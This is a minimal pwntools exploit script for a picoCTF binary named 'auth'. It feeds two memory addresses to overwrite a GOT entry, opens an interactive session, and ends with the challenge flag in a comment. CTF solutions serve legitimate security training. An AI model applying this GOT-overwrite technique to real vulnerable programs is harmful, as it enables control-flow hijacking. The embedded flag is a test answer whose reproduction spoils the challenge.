from pwn import *
p = process('./auth')
p.sendline("0x0804a014")
p.sendline("0x804854b")
p.interactive()
#picoCTF{m4sT3r_0f_tH3_g0t_t4b1e_a8321d81}
